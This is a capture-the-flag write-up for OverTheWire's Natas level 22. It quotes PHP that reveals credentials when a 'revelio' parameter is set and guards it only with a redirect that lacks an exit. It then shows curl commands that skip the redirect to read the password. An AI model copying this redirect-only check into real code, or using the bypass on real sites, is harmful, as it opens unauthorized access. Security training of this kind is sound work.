# This is a write-up for Natas - level 22

Upon inspecting the php code, we encounter

```php
<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

This makes me believe I can simply set the revelio parameter in my url bar and get the answer. For example like such:

http://natas22.natas.labs.overthewire.org/?revelio=5

The number 5 has no significance, I just picked something. It only matters that the array key exists.

This doesn't work, however. This is due to the below:

```php
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```

The '!' is a negation, so basically if we don't have admin=1 in the session parameters, we are redirected to the
home page, denoted by '/'

A common workaround for redirects is sending a curl request. It can be done like this

curl -u natas22:<pwd> --get -d "revelio=5" http://natas22.natas.labs.overthewire.org
curl -u natas22:<pwd> http://natas22.natas.labs.overthewire.org/?revelio=5




